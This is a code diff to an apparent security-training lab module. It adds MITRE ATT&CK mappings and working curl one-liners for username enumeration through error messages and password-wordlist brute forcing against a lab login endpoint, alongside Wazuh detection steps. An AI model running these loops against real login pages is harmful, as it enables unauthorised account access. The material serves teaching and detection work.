@@ -37,6 +37,15 @@ class BruteForceModule(BaseModule):
     category = Category.AUTH
     scenario_id = "APP-06"
     severity = Severity.HIGH
+    # MITRE ATT&CK — enumerate identities (recon) then brute the login.
+    mitre = {
+        "tactics": ["TA0043 Reconnaissance", "TA0006 Credential Access"],
+        "techniques": [
+            {"id": "T1589.001", "name": "Gather Victim Identity Information: Credentials", "tactic": "Reconnaissance"},
+            {"id": "T1110.001", "name": "Brute Force: Password Guessing", "tactic": "Credential Access"},
+            {"id": "T1110.004", "name": "Brute Force: Credential Stuffing", "tactic": "Credential Access"},
+        ],
+    }
     # Lab metadata — consumed by /api/modules and rendered in the guided workspace.
     lab = {
         "target_path": "/auth/login",
@@ -47,15 +56,25 @@ class BruteForceModule(BaseModule):
             "endpoint is brute-forceable with a lab-internal wordlist."
         ),
         "learner_steps": [
-            {"action": "Open the login page in the Lab Browser and observe the form.",
-             "expected": "A styled login form with username/password fields loads."},
-            {"action": "Try logging in with wrong credentials (e.g. admin / wrong).",
-             "expected": "The page shows an error — notice there is no lockout or CAPTCHA."},
-            {"action": "Try different username/password combinations manually.",
-             "expected": "You discover distinct error messages for unknown users vs wrong passwords."},
-            {"action": "Find a valid credential pair (hint: try common passwords like password123).",
-             "expected": "Successful login redirects you to the profile page."},
+            {"action": "Recon the login form — discover the field names you must POST.",
+             "technique": "T1595.002 Active Scanning: Vulnerability Scanning",
+             "command": "curl -s http://target-agent/auth/login | grep -o 'name=\"[^\"]*\"'",
+             "expected": "The form posts 'username' and 'password' to /auth/login."},
+            {"action": "Username enumeration — the error message leaks valid accounts.",
+             "technique": "T1589.001 Gather Victim Identity Information: Credentials",
+             "command": "for u in admin ghost operator nobody; do echo -n \"$u -> \"; curl -s -d \"username=$u&password=x\" http://target-agent/auth/login | grep -oE 'Incorrect password|Account not found'; done",
+             "expected": "'Incorrect password' = the user exists; 'Account not found' = it does not."},
+            {"action": "Password guessing — no rate limit or lockout, so iterate a wordlist.",
+             "technique": "T1110.001 Brute Force: Password Guessing",
+             "command": "for p in password 123456 admin letmein password123 lab2024; do echo -n \"$p -> \"; curl -s -o /dev/null -w '%{http_code}\\n' -d \"username=admin&password=$p\" http://target-agent/auth/login; done",
+             "expected": "A failed guess returns 401; the correct one returns 302 (redirect)."},
+            {"action": "Confirm the valid pair by following the redirect to /profile/.",
+             "technique": "T1110.004 Brute Force: Credential Stuffing",
+             "command": "curl -s -i -d 'username=admin&password=password123' http://target-agent/auth/login | grep -iE 'HTTP/|Location'",
+             "expected": "HTTP 302 with Location: /profile/ — credentials admin:password123 are valid."},
             {"action": "Check the Evidence panel for Wazuh detections.",
+             "technique": "T1110 Brute Force",
+             "command": "# review the activity log / Wazuh feed in ATTENSE",
              "expected": "A multiple-failed-login alert appears in the detection feed."},
         ],
         "detection_rule": "Wazuh multiple-failed-logins / authentication_failures > threshold",
@@ -69,18 +88,27 @@ class BruteForceModule(BaseModule):
     steps = [
         {
             'title': 'Enumerate login endpoint',
+            'tactic': 'Reconnaissance',
+            'technique': 'T1589.001 Gather Victim Identity Information: Credentials',
+            'command': "curl -s http://target-agent/auth/login | grep -o 'name=\"[^\"]*\"'",
             'hint': 'POST /auth/login with Content-Type: application/x-www-form-urlencoded',
             'expected': 'HTTP 401 on failure, 302 redirect on success',
             'markers': ['Attacking ', 'user(s)'],
         },
         {
             'title': 'Iterate credential wordlist',
+            'tactic': 'Credential Access',
+            'technique': 'T1110.001 Brute Force: Password Guessing',
+            'command': "for p in password 123456 admin password123 lab2024; do curl -s -o /dev/null -w '%{http_code} '$p'\\n' -d \"username=admin&password=$p\" http://target-agent/auth/login; done",
             'hint': 'Up to 6 usernames × 8 passwords = 48 attempts',
             'expected': 'One StepResult per credential pair',
             'markers': ['Targeting:'],
         },
         {
             'title': 'Detect valid credentials',
+            'tactic': 'Credential Access',
+            'technique': 'T1110.004 Brute Force: Credential Stuffing',
+            'command': "curl -s -i -d 'username=admin&password=password123' http://target-agent/auth/login | grep -iE 'HTTP/|Location'",
             'hint': "Redirect to /profile/ or 'My Account' in response indicates success",
             'expected': "Evidence line 'CREDENTIAL FOUND: user:pass'",
             'markers': ['CREDENTIAL FOUND', 'No valid credentials', 'Complete —'],
@@ -117,6 +145,11 @@ class BruteForceModule(BaseModule):
         delay = int(opts.get("delay_ms", 50)) / 1000.0
         endpoint = "/auth/login"
         url = target.base_url + endpoint
+
+        # ── Recon (T1589.001): fetch the login form to confirm field names ──
+        self._log(log_fn, "Recon: fetching /auth/login to confirm the form fields...")
+        base = self._get(url, label="recon-baseline", timeout=target.timeout)
+        steps.append(base)
 
         self._log(log_fn, f"Attacking {len(usernames)} user(s) × {len(_PASSWORDS)} passwords")
 
